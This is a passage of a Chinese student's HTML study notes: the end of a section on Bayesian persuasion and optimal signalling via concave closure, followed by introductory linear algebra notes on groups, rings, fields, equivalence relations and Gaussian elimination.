<p>此处求期望是考虑到一般的情况下 <span class="arithmatex">\(v\)</span> 的表达式为 <span class="arithmatex">\(v(a, \omega)\)</span>，因此需要针对 <span class="arithmatex">\(\omega\)</span> 求期望。而在导师写推荐信的例子中，因为 <span class="arithmatex">\(v\)</span> 与 <span class="arithmatex">\(\omega\)</span> 无关，故是可以省略的。基于此，可以定义最优信号机制问题：</p>
<div class="arithmatex">\[
\max_{\tau} \mathbb{E}_{\tau} \hat{v}(\mu)
\]</div>
<div class="arithmatex">\[
\text{s.t. } \sum_{\text{Supp}(\tau)} \mu\tau(\mu) = \mu_0
\]</div>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>看起来这个形式化的式子比较复杂，但实际上还是很好理解的</p>
<p>首先<span class="arithmatex">\(\hat{v}(\mu)\)</span>一项表示对于一个后验概率(知道信号后对学生类型的判断)，接收者的最优行动(雇用/不雇用)，发送者在这一情况下的期望效用</p>
<p><span class="arithmatex">\(\max_{\tau} \mathbb{E}_{\tau} \hat{v}(\mu)\)</span>表示我们希望在所有可能的后验概率分布的分布中，找到使得发送者的期望效用最大的那一种。</p>
<p><span class="arithmatex">\(\text{s.t. } \sum_{\text{Supp}(\tau)} \mu\tau(\mu) = \mu_0\)</span>表示我们希望后验概率分布的分布是贝叶斯可行的。</p>
</div>
<h3 id="note-datamarket-beyesian-_15">显示原理<a class="headerlink" href="#note-datamarket-beyesian-_15" title="Permanent link">&para;</a></h3>
<div class="admonition theorem">
<p class="admonition-title">显示原理</p>
<p>存在一个信号机制使得发送者的效用达到 <span class="arithmatex">\(v^*\)</span> 当且仅当存在一个直接（<strong>straightforward</strong>）信号机制使得发送者的效用达到 <span class="arithmatex">\(v^*\)</span>。其中直接信号机制是指满足 <span class="arithmatex">\(S \subseteq A\)</span> 且接收者的最优行动等于信号实现的信号。</p>
</div>
<div class="admonition example">
<p class="admonition-title">导师推荐信中的直接信号机制</p>
<ul>
<li>放在导师写推荐信的例子中，直接信号机制指信号实现空间 <span class="arithmatex">\(S \subseteq \{\text{excellent}, \text{average}\}\)</span> 且当接收者看到优秀的推荐信的信号时雇用，看到一般的推荐信的信号时不雇用的信号；</li>
<li>事实上此前给出的最优信号机制的确满足直接信号机制的定义；</li>
<li>总而言之，显示原理表明，最优信号机制设计所需的信号实现数目（后验概率数目）是不超过接收者行动数目的；</li>
</ul>
</div>
<p>基于显示原理，原始的最优信号机制设计问题可以简化为：</p>
<div class="arithmatex">\[
\max_{\tau} \sum_{\mu \in \text{Supp}(\tau)} \hat{v}(\mu) \tau(\mu)
\]</div>
<div class="arithmatex">\[
\text{s.t. } \sum_{\mu \in \text{Supp}(\tau)} \mu \tau(\mu) = \mu_0
\]</div>
<p>其中 <span class="arithmatex">\(\text{Supp}(\tau)\)</span> 的大小不超过 <span class="arithmatex">\(|A|\)</span>（接收者行动集合的大小）。</p>
<h3 id="note-datamarket-beyesian-_16">凹包络<a class="headerlink" href="#note-datamarket-beyesian-_16" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">凹包络</p>
<p>函数 <span class="arithmatex">\(\hat{v}\)</span> 的凹包络（concave closure）<span class="arithmatex">\(V\)</span> 定义为：</p>
<div class="arithmatex">\[
V(\mu) = \sup\{z \mid (\mu, z) \in \text{co}(\hat{v})\}
\]</div>
<p>其中 <span class="arithmatex">\(\text{co}(\hat{v})\)</span> 表示函数 <span class="arithmatex">\(\hat{v}\)</span> 的图像的凹包。</p>
<p>直观而言，一个函数的凹包络就是大于等于这个函数的最小凹函数。</p>
<p><figure markdown="span">
    <img alt="凹包络" src="../NOTE/DataMarket/img/%E5%87%B9%E5%8C%85%E7%BB%9C.png" width="500" />
</figure></p>
</div>
<h3 id="note-datamarket-beyesian-_17">关键性质<a class="headerlink" href="#note-datamarket-beyesian-_17" title="Permanent link">&para;</a></h3>
<p>函数 <span class="arithmatex">\(\hat{v}\)</span> 的凹包络是求解最优信号机制问题的关键：</p>
<ul>
<li>
<p><strong>存在性</strong>：注意到如果 <span class="arithmatex">\((\mu_0, z) \in \text{co}(\hat{v})\)</span>，则必然存在后验概率分布的分布 <span class="arithmatex">\(\tau\)</span> 使得 <span class="arithmatex">\(\mathbb{E}_\mu = \mu_0\)</span> 且 <span class="arithmatex">\(\mathbb{E}_\tau \hat{v}(\mu) = z\)</span>（因为期望也是凸组合）；</p>
</li>
<li>
<p><strong>最优性</strong>：<span class="arithmatex">\(V(\mu_0)\)</span> 则是所有这样的 <span class="arithmatex">\(z\)</span> 中的最大值；</p>
</li>
</ul>
<p>因此 <span class="arithmatex">\(V(\mu_0)\)</span> 就是最优信号机制问题的解。总而言之我们可以得到下面的推论，从而回答了之前提出的所有问题：</p>
<div class="admonition theorem">
<p class="admonition-title">主要推论</p>
<p>最优信号机制问题的解存在，最大值为 <span class="arithmatex">\(V(\mu_0)\)</span>。进一步地，发送者设计信号能提升自己的效用当且仅当 <span class="arithmatex">\(V(\mu_0) &gt; \hat{v}(\mu_0)\)</span>。</p>
</div>
<figure>
    <img alt="凹包络" src="../NOTE/DataMarket/img/ex9.png" width="600" />
    <figcaption>运用结论解之前的例子</figcaption>
</figure>
<p>只要企业的后验概率中好学生的概率占比大于<span class="arithmatex">\(1/3\)</span>，则企业一定会雇佣，因为此时雇佣效用为</p>
<div class="arithmatex">\[
    1 \times 1/3 - 0.5 \times 2/3 &gt; 0
\]</div>
<p>比不雇佣好</p>
<p>这个凹包络前半部分的解析式为<span class="arithmatex">\(V(\mu) = 3\mu\)</span>,</p>
<p>原例子中<span class="arithmatex">\(V(0.25) = 0.75\)</span>，故导师最佳效用为<span class="arithmatex">\(0.75\)</span></p>
<p>并且此时两个后验分布设为两个端点，即在一个后验分布中认为所有学生都是一般，在另一个后验分布中认为<span class="arithmatex">\(1/3\)</span>的学生是优秀，<span class="arithmatex">\(2/3\)</span>的学生是普通</p>
<div class="arithmatex">\[
    \mu_1 = (0, 1), \mu_2 = (1/3, 2/3)
\]</div>
<p>设后验分布的分布为<span class="arithmatex">\(\tau = (\tau(\mu_1), \tau(\mu_2)) = (x, 1-x)\)</span>，则</p>
<div class="arithmatex">\[
   x(0,1)+(1-x)(1/3,2/3) = ((1-x)/3, x/3+2/3) = (0.25, 0.75)
\]</div>
<p>解得<span class="arithmatex">\(x = 0.25\)</span>，即<span class="arithmatex">\(\mu_1\)</span>的概率为<span class="arithmatex">\(0.25\)</span>，<span class="arithmatex">\(\mu_2\)</span>的概率为<span class="arithmatex">\(0.75\)</span></p>
<p>进一步的，可以利用</p>
<div class="arithmatex">\[
    \pi(s | \omega) = \frac{\mathbb{P}(s)\mu_s(\omega)}{\mu_0(\omega)} = \frac{\tau(\mu_s)\mu_s(\omega)}{\mu_0(\omega)}
\]</div>
<p>计算出对应的信号机制</p>
<div class="arithmatex">\[
    \pi(1 | ex) = \frac{P(1)\mu_1(ex)}{\mu_0(ex)} = \frac{0.25 \times 0}{0.25} = 0
\]</div>
<div class="arithmatex">\[
    \pi(1 | av) = \frac{P(1)\mu_1(av)}{\mu_0(av)} = \frac{0.25 \times 1}{0.75} = 1/3
\]</div>
<div class="arithmatex">\[
    \pi(2 | ex) = \frac{P(2)\mu_2(ex)}{\mu_0(ex)} = \frac{0.75 \times 1/3}{0.25} = 1
\]</div>
<div class="arithmatex">\[
    \pi(2 | av) = \frac{P(2)\mu_2(av)}{\mu_0(av)} = \frac{0.75 \times 2/3}{0.75} = 2/3
\]</div>
<p>这与之前的结果一致。所以<span class="arithmatex">\(\mu_1\)</span>对应一般的推荐信，<span class="arithmatex">\(\mu_2\)</span>对应优秀的推荐信，这个例子也说明信号的名称不重要。</p>
<h3 id="note-datamarket-beyesian-_18">对接收者的影响<a class="headerlink" href="#note-datamarket-beyesian-_18" title="Permanent link">&para;</a></h3>
<p>最后解决第三个问题：信号接收者是否愿意接受发送者的信号机制？</p>
<div class="admonition theorem">
<p class="admonition-title">命题</p>
<p>在任意信号机制 <span class="arithmatex">\(S, \pi(s | \omega)\)</span> 下，接收者的效用都不会低于其在没有信号的情况下的效用。</p>
</div>
<h4 id="note-datamarket-beyesian-_19">证明过程<a class="headerlink" href="#note-datamarket-beyesian-_19" title="Permanent link">&para;</a></h4>
<p>任取信号机制 <span class="arithmatex">\(S, \pi(s | \omega)\)</span>，当接收者看到 <span class="arithmatex">\(s \in S\)</span> 时，其效用为：</p>
<div class="arithmatex">\[
\max_{a \in A} \mathbb{E}_{\mu_s}[u(a, w)] = \max_{a \in A} \sum_{\omega \in \Omega} \mu_s(\omega)u(a, \omega)
\]</div>
<div class="arithmatex">\[
= \max_{a \in A} \sum_{\omega \in \Omega} \frac{\pi(s | \omega)\mu_0(\omega)}{\sum_{\omega' \in \Omega} \pi(s | \omega')\mu_0(\omega')} u(a, \omega)
\]</div>
<p>因此在信号机制 <span class="arithmatex">\(S, \pi(s | \omega)\)</span> 下，其期望效用为：</p>
<div class="arithmatex">\[
\begin{align}
\sum_{s \in S} \mathbb{P}(s) \cdot \max_{a \in A} \mathbb{E}_{\mu_s}[u(a, w)] &amp;= \sum_{s \in S} \left(\sum_{\omega' \in \Omega} \pi(s | \omega')\mu_0(\omega')\right) \cdot \max_{a \in A} \mathbb{E}_{\mu_s}[u(a, w)]\\
&amp;= \sum_{s \in S} \max_{a \in A} \sum_{\omega \in \Omega} \pi(s | \omega)\mu_0(\omega)u(a, \omega)\\
&amp;\geq \max_{a \in A} \sum_{s \in S} \sum_{\omega \in \Omega} \pi(s | \omega)\mu_0(\omega)u(a, \omega)\\
&amp;= \max_{a \in A} \sum_{\omega \in \Omega} \left(\sum_{s \in S} \pi(s | \omega)\right) \mu_0(\omega)u(a, \omega)\\
&amp;= \max_{a \in A} \sum_{\omega \in \Omega} \mu_0(\omega)u(a, \omega) = \max_{a \in A} \mathbb{E}_{\mu_0}[u(a, w)]
\end{align}
\]</div></section></section></section>
                    <section class='print-page md-section' id='section-2-3' heading-number='2.3'>
                        <h1>🔬 数学与物理<a class='headerlink' href='#section-2-3' title='Permanent link'></a>
                        </h1>
                    
                    <section class='print-page md-section' id='section-2-3-1' heading-number='2.3.1'>
                        <h1>线性代数 (LINEAR-ALGEBRA)<a class='headerlink' href='#section-2-3-1' title='Permanent link'></a>
                        </h1>
                    <section class="print-page" id="note-la-linear-algebra" heading-number="2.3.1.1"><h1 id="note-la-linear-algebra-_1">线性代数个人笔记<a class="headerlink" href="#note-la-linear-algebra-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 309 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 1 分钟</p>
</div>
<h2 id="note-la-linear-algebra-_2">发点牢骚<a class="headerlink" href="#note-la-linear-algebra-_2" title="Permanent link">&para;</a></h2>
<p>线性代数一开始给我的感觉并没有十分令人喜欢，甚至上第一节课的时候还觉得这门课有些不知所云：解方程，解方程有什么好讲的。在上大学以前从没有接触过的代数结构以及许多抽象的描述也让我痛苦了有这么一会儿。</p>
<p>好像顿悟是一瞬间的事，盯着那些符号在一个想象中的"线性空间"变来变去，当他们具体化以后又能解决一个个实际的数学问题。这也太美了。</p>
<p>这个学期学完了线代二之后，似乎我就与这门课没什么交集了。但是我想把我学到的东西记下来，不忍让它们在我的脑海里随时间慢慢淡去</p>
<p>最后，感谢教授这门课的吴志祥老师，让我一步一步感受到线性代数的美妙。</p>
<blockquote>
<p>吴爷爷:我这门课很简单，只有简单的加减乘除四则运算，甚至除法都不太需要.</p>
</blockquote>
<p>也感谢竺可桢学院的辅学学长们以及特别鸣谢旷世巨作<a href="../NOTE/LA/LALU.pdf"><strong>LALU</strong></a></p></section><section class="print-page" id="note-la-%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86" heading-number="2.3.1.2"><h1 id="note-la-%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86-_1">前置知识<a class="headerlink" href="#note-la-%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 2618 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 9 分钟</p>
</div>
<h2 id="note-la-%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86-_2">基本的代数结构<a class="headerlink" href="#note-la-%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86-_2" title="Permanent link">&para;</a></h2>
<blockquote>
<p>吴爷爷在每节课末尾都会飙车,第一节课起飞的是群环域</p>
</blockquote>
<p><strong>代数系统是什么</strong></p>
<div class="admonition 代数系统">
<p class="admonition-title">代数系统</p>
<p>一般地,我们把一个非空集合 <span class="arithmatex">\(X\)</span> 和在 <span class="arithmatex">\(X\)</span> 上定义的若干代数运算 <span class="arithmatex">\(f_1,...,f_k\)</span> 组成的系统称为代数系统（简称代数系）,记作 <span class="arithmatex">\(&lt;X:f_1,...,f_k&gt;\)</span></p>
</div>
<p>说白了,代数系统就是把一个集合,以及你能对这个集合中的元素进行什么操作告诉你。</p>
<p>举个例子,我们小学(或者是幼儿园？)学过的整数(<span class="arithmatex">\(\mathbf{Z}\)</span>)的加法(+)就是一种代数系（<span class="arithmatex">\(&lt;\mathbf{Z},+&gt;\)</span>）</p>
<p>要注意的是,代数系统上定义的运算必须保证封闭性,也就是运算后的结果必须仍然在集合 <span class="arithmatex">\(X\)</span> 中</p>
<p>在整数的加法中,我们有以下运算性质</p>
<ul>
<li>结合律 <span class="arithmatex">\((a+b)+c=a+(b+c)\)</span></li>
<li>单位元：存在一个元素 0,使得 <span class="arithmatex">\(a+0=0+a=a\)</span>；</li>
<li>逆元：对于任意<span class="arithmatex">\(a\)</span>,存在一个元素<span class="arithmatex">\(−a\)</span>,使得 <span class="arithmatex">\(a+(−a)=(−a)+a = 0\)</span> 。<span class="arithmatex">\(0\)</span> 为单位元；</li>
<li>交换律：<span class="arithmatex">\(a+b=b+a\)</span></li>
</ul>
<p>平平无奇,对吧,那么我们现在来抽象一下</p>
<p>在集合<span class="arithmatex">\(G\)</span>上的运算<span class="arithmatex">\(◦\)</span>,我们有以下性质</p>
<ul>
<li>结合律 <span class="arithmatex">\((a ◦ b) ◦ c=a ◦ (b ◦ c)\)</span></li>
<li>单位元：存在一个元素 <span class="arithmatex">\(e\)</span>,使得 <span class="arithmatex">\(a ◦ e=e ◦ a=a\)</span>；</li>
<li>逆元：对于任意<span class="arithmatex">\(a\)</span>,存在一个元素<span class="arithmatex">\(\overline{a}\)</span>,使得 <span class="arithmatex">\(a ◦ \overline{a} =  \overline{a} ◦ a = e\)</span> <span class="arithmatex">\(e\)</span> 为单位元；</li>
<li>交换律：<span class="arithmatex">\(a ◦ b=b ◦ a\)</span></li>
</ul>
<p>注意上面的定义是抽象的,忽略集合中元素的意义差异（元素可以表示实数,也可以在表示平面向量等几何对象）,同时也可以忽略运算定义的差异,只关心运算作用于集合元素的性质.</p>
<p>接下来,我们就可以介绍群,环,域三个代数系统了</p>
<div class="admonition 群">
<p class="admonition-title">群</p>
<p>若运算 ◦ 满足结合律,则称代数系统 <span class="arithmatex">\(〈G : ◦〉\)</span> 为半群；若在半群基础上存在单位元,
则称之为含幺半群；若在含幺半群基础上每个元素存在逆元,则称之为群；若在群的
基础上运算还满足交换律,则称之为 Abel 群,也称交换群.</p>
</div>
<ul>
<li><strong>群的单位元唯一</strong>：若存在两个单位元<span class="arithmatex">\(e_1,e_2\)</span>,则<span class="arithmatex">\(e_1=e_1◦ e_2=e_2\)</span></li>
<li><strong>群中每一个元素逆元唯一</strong>:设 <span class="arithmatex">\(b\)</span> 和 <span class="arithmatex">\(c\)</span> 都是 <span class="arithmatex">\(a\)</span> 的逆元,则
<span class="arithmatex">\(b = b ◦ e = b ◦ (a ◦ c) = (b ◦ a) ◦ c = e ◦ c = c.\)</span></li>
</ul>
<div class="admonition 环">
<p class="admonition-title">环</p>
<p>我们称代数系统 <span class="arithmatex">\(〈R : +, ◦〉\)</span> 为一个环,如果</p>
<ol>
<li><span class="arithmatex">\(〈R : +〉\)</span> 是交换群,其单位元记作 0；</li>
<li><span class="arithmatex">\(〈R : ◦〉\)</span> 是幺半群；</li>
<li>运算 <span class="arithmatex">\(◦\)</span> 对 <span class="arithmatex">\(+\)</span> 满足左、右分配律,即</li>
</ol>
<p><span class="arithmatex">\(a ◦ (b + c) = a ◦ b + a ◦ c\)</span></p>
<p><span class="arithmatex">\((b + c) ◦ a = b ◦ a + c ◦ a\)</span></p>
<p>若进一步每个非 0（+ 运算单位元）元素关于 ◦ 都有逆元,则称之为除环. 另外,若
上述定义中 ◦ 运算满足交换律,则称为交换环.</p>
</div>
<div class="admonition 域">
<p class="admonition-title">域</p>
<p>我们称代数系统 <span class="arithmatex">\(〈F : +, ◦〉\)</span> 为一个域,如果</p>
<ol>
<li><span class="arithmatex">\(〈F : +〉\)</span> 是交换群,其单位元记作 0；</li>
<li><span class="arithmatex">\(〈F^* : ◦〉\)</span> 是交换群；其中<span class="arithmatex">\(F^*\)</span>指<span class="arithmatex">\(F\)</span>去掉<span class="arithmatex">\(+\)</span>的单位元</li>
<li>运算 <span class="arithmatex">\(◦\)</span> 对 <span class="arithmatex">\(+\)</span> 满足左、右分配律,即</li>
</ol>
<p><span class="arithmatex">\(a ◦ (b + c) = a ◦ b + a ◦ c\)</span></p>
<p><span class="arithmatex">\((b + c) ◦ a = b ◦ a + c ◦ a\)</span></p>
</div>
<p>我们可以结合一下交换环和除环,在环中定义的<span class="arithmatex">\(〈R : ◦〉\)</span> 是幺半群就变成了群,此时,这个交换除环满足所有域的要求,也就是说,<strong>交换除环即为域</strong>。</p>
<p>关于数域,我们有如下两个结论：</p>
<ol>
<li>数集 <span class="arithmatex">\(F\)</span> 对数的加法和乘法构成数域的充要条件为：<span class="arithmatex">\(F\)</span> 包含 0,1 且对数的加、减、
乘、除（除数不为 0）运算封闭；</li>
<li>任何数域都包含有理数域 <span class="arithmatex">\(\mathbf{Q}\)</span>,即 <span class="arithmatex">\(\mathbf{Q}\)</span> 是最小的数域.</li>
</ol>
<p>引入了代数结构之后,我们可以把它们暂且理解为一种模型,就像我们高中练了千百道题目之后,提炼出来了一种普遍的做法,在发现许多具体的代数系统的共性之后,我们也可以把它们模型化,而不必重复研究同样的东西了。</p>
<h2 id="note-la-%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86-_3">等价关系<a class="headerlink" href="#note-la-%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86-_3" title="Permanent link">&para;</a></h2>
<blockquote>
<p>我们时常需要讨论集合中元素之间的关系. 例如直线间的平行、垂直、相交,或是数之间的大于、等于、小于关系.“关系” 将会多次出现在线性代数的学习过程中,因此我们很有必要在此形式化定义这一概念,并强调其中一类特定的关系——等价关系.</p>
</blockquote>
<p>从最简单的二元关系开始,在此之前,有必要引入集合的笛卡尔积</p>
<div class="admonition info 笛卡尔积">
<p class="admonition-title">Info</p>
<p>设 <span class="arithmatex">\(A\)</span> 和 <span class="arithmatex">\(B\)</span> 是两个非空集合,我们把集合
  <span class="arithmatex">\(A × B = \{(a, b) | a ∈ A, b ∈ B\}\)</span>
  称为集合 <span class="arithmatex">\(A\)</span> 和 <span class="arithmatex">\(B\)</span> 的 <strong>笛卡尔积</strong>.</p>
</div>
<p>我们熟悉的平面点集就是一种<span class="arithmatex">\(\mathbf{R} \times \mathbf{R}\)</span>的具体表示,空间点集就是一种<span class="arithmatex">\(\mathbf{R} \times \mathbf{R} \times \mathbf{R}\)</span>的具体表示</p>
<p>回到我们的二元关系中,在人类<span class="arithmatex">\(\times\)</span>人类这个笛卡尔积上,(老师a,学生b)这一有序对定义了一种师生关系,更规范一点,我们可以这样写</p>
<div class="arithmatex">\[\{(a,b)|a,b\in Humans ,\text{a is the teacher of b}\}\]</div>
<p>那么将人类<span class="arithmatex">\(\times\)</span>人类这一集合中所有的师生放在一起,就构成了人类中的师生关系</p>
<p>我们把人类<span class="arithmatex">\(\times\)</span>人类抽象为集合<span class="arithmatex">\(G \times G\)</span>,将师生关系抽象为<span class="arithmatex">\(R\)</span>这一种关系。就可以研究更多其它的东西了。</p>
<p>接下来,我们先引出关系中不得不讨论的以下几个性质</p>
<p><strong>自反性</strong>:
<span class="arithmatex">\(\forall a \in G,aRa\)</span>,也就是集合中的元素自己和自己满足这种关系,显然师生关系没有这个性质,但是实数上的<span class="arithmatex">\(\leqslant\)</span>满足这个性质</p>
<p><strong>对称性</strong>
 <span class="arithmatex">\(a R b \Rightarrow b R a\)</span>,例如平行关系</p>
<p><strong>传递性</strong>
 <span class="arithmatex">\(a R b,b R c \Rightarrow a R c\)</span>,例如<span class="arithmatex">\(\leqslant\)</span>关系</p>
<div class="admonition 定义">
<p class="admonition-title">定义</p>
<p><strong>偏序关系</strong>:仅不满足对称性的关系叫偏序关系,例如整除关系</p>
<p><strong>等价关系</strong>:以上性质全部都满足的关系叫做等价关系</p>
</div>
<p>有了等价关系<span class="arithmatex">\(R\)</span>,我们可以由这个关系对集合进行一些划分</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>整数域<span class="arithmatex">\(Z\)</span>上,模2同余是一种等价关系,在这种关系下,我们可以不用考虑这么多无穷无尽的数字,只需要考虑两种元素,模2余1的元素和模2余0的元素,也就是我们早已熟知的:<strong>奇数和偶数</strong></p>
</div>
<p>这种划分实在是有效,我们可以把等价的元素装在一起,起名为等价类</p>
<div class="admonition 等价类">
<p class="admonition-title">等价类</p>
<p>若<span class="arithmatex">\(R\)</span>是集合<span class="arithmatex">\(G\)</span>上的一个等价关系,若<span class="arithmatex">\(a,b \in G,a R b\)</span>,则称<span class="arithmatex">\(a,b\)</span>等价,所有<span class="arithmatex">\(G\)</span>中与<span class="arithmatex">\(a\)</span>等价的元素构成的集合可以称为<span class="arithmatex">\(a\)</span>所在的等价类
{<span class="arithmatex">\(b \in A | bRa\)</span>},可以表示为 <span class="arithmatex">\(\overline{a}\)</span></p>
</div>
<p>那么自然想到整数可以划分为{<span class="arithmatex">\(\overline{0},\overline{1}\)</span>},其实不取0和1,取2和3也是一样的,只需要取出这个等价类里面的一个代表元就可以了.</p>
<p>最后,我们来一点正式的定义</p>
<div class="admonition 分划">
<p class="admonition-title">分划</p>
<p>设 <span class="arithmatex">\(R\)</span> 是集合 <span class="arithmatex">\(A\)</span> 的等价关系,则由所有不同的等价类构成的子集族 {<span class="arithmatex">\(\overline{a}\)</span>} 是 <span class="arithmatex">\(A\)</span> 的分划.
  反之,我们也可以基于分划在 <span class="arithmatex">\(A\)</span> 中定义等价关系.</p>
</div>
<div class="admonition 商集">
<p class="admonition-title">商集</p>
<p>设 <span class="arithmatex">\(R\)</span> 是集合 <span class="arithmatex">\(A\)</span> 的等价关系,以关于 <span class="arithmatex">\(R\)</span> 的等价类为元素的集合（实际上是集合构成
  的集合,又称集族）{<span class="arithmatex">\(\overline{a}\)</span>} 称为 <span class="arithmatex">\(A\)</span> 对 <span class="arithmatex">\(R\)</span> 的商集,记为 <span class="arithmatex">\(A/R\)</span>. 由
  <span class="arithmatex">\(\pi(a) = a, \forall a ∈ A\)</span>
  定义的 <span class="arithmatex">\(A\)</span> 到 <span class="arithmatex">\(A/R\)</span> 上的映射 <span class="arithmatex">\(\pi\)</span> 称为 <span class="arithmatex">\(A\)</span> 到 <span class="arithmatex">\(A/R\)</span> 上的自然映射.</p>
</div>
<h2 id="note-la-%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86-_4">高斯消元法<a class="headerlink" href="#note-la-%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86-_4" title="Permanent link">&para;</a></h2>
<blockquote>
<p>不就是加加减减,有什么好单独拿出来说的呢(<del>等你考试解错这个送分题就老实了</del>)</p>
</blockquote>
<p>一般的,对于一个由 <span class="arithmatex">\(m\)</span> 个方程组成的 <span class="arithmatex">\(n\)</span> 元（即变量数为 <span class="arithmatex">\(n\)</span>）线性方程组</p>
<div class="arithmatex">\[\begin{cases} \begin{aligned}a_{11}x_1+a_{12}x_2+\cdots+a_{1n}x_n &amp; = b_1\\ a_{21}x_1+a_{22}x_2+\cdots+a_{2n}x_n &amp;=b_2\\ &amp;\vdots\\ a_{m1}x_1+a_{m2}x_2+\cdots+a_{mn}x_n &amp; = b_m\end{aligned}\end{cases}\]</div>
<p>将其系数排列成矩阵</p>
<div class="arithmatex">\[\begin{pmatrix}a_{11} &amp; a_{12} &amp; \cdots &amp; a_{1n} \\ a_{21} &amp; a_{22} &amp; \cdots &amp; a_{2n} \\ \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\ a_{m1} &amp; a_{m2} \cdots &amp;a_{mn}\end{pmatrix}\]</div>
<p>且记<span class="arithmatex">\(\vec{b}=(b_1,b_2,\ldots,b_m)^\mathrm{T}\)</span>,若 <span class="arithmatex">\(\vec{b}=\vec{0}\)</span> 则称此方程为齐次线性方程组,否则为非齐次线性方程组. 再将<span class="arithmatex">\(n\)</span>个未知量记为<span class="arithmatex">\(n\)</span>元列向量<span class="arithmatex">\(X=(x_1,x_2,\ldots,x_n)^\mathrm{T}\)</span>,我们便可以把方程组简记为<span class="arithmatex">\(AX=\vec{b}\)</span>.</p>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>T代表转置,也就是要竖着写</p>
</div>
<p>令<span class="arithmatex">\(\vec{\beta}_i=(a_{1i},a_{2i},\ldots,a_{mi})^\mathrm{T}\)</span>,即方程组系数矩阵的某一列,则方程组还可以记为<span class="arithmatex">\(x_1\vec{\beta}_1+x_2\vec{\beta}_2+\cdots+x_n\vec{\beta}_n=\vec{b}\)</span>,这一形式将在之后多次见到.</p>
<p>在以上的记号下,我们可以将解线性方程组的过程转化为矩阵的初等行变换. 高斯消元法的一般步骤如下：</p>
<p>线性方程组<span class="arithmatex">\(\overset{1}{\longrightarrow}\)</span>增广矩阵<span class="arithmatex">\(\overset{2}{\longrightarrow}\)</span>阶梯矩阵<span class="arithmatex">\(\overset{3}{\longrightarrow}\)</span>（行）简化阶梯矩阵<span class="arithmatex">\(\overset{4}{\longrightarrow}\)</span>解</p>
<ul>
<li>步骤一:把矩阵写为<span class="arithmatex">\((A,b)\)</span>的形式即可。</li>
<li>步骤二:从第一行开始,第一次用第一行消去下面几行的第一个元素,第二次用第二行消去下面几行的第二个,以此类推,做到最后一行只剩一个。</li>
<li>步骤三:从最后一行开始,此时最后一行只剩最后一个,用最后一行消去上面所有行的最后一个(如果可能的话),这样倒数第二行只剩一个,继续做下去直到消去不了。</li>
<li>步骤四:这里有三种情况<ul>
<li>无解:如果出现0=常数的情况,那就是无解(不是常数=0)</li>
<li>唯一解:简化阶梯矩阵(系数矩阵)是<span class="arithmatex">\(n\times n\)</span>的,且没有全0行。后面我们直接可以用系数矩阵可逆(行列式不为0)来直接判断</li>
<li>有无用的矩阵,体现为简化阶梯矩阵有全0行,更一般地说,有效方程个数少于未知数的个数,设出自由未知量将其令为<span class="arithmatex">\(k_1,k_2,\ldots\)</span>,然后代入增广矩阵对应的方程组即可</li>
</ul>
</li>
</ul>
<blockquote>
<p>累了,这一部分就写这么多吧</p>
</blockquote></section><section class="print-page" id="note-la-note" heading-number="2.3.1.3"><h1 id="note-la-note-lalu">我不更了，我写LALU去了<a class="headerlink" href="#note-la-note-lalu" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
